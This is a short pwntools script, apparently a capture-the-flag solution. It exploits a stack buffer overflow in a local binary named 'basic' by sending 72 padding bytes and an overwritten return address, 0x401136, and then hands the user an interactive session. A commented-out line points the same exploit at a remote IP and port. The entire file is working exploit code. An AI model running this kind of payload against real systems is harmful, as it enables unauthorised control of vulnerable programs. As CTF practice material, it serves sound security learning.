from pwn import *


# p = remote("34.123.15.202",5000)
p = process("./basic")

buf = b'A'* 72 + p64(0x0000000401136)

# p.recvuntil("")
p.sendline(buf)

p.interactive()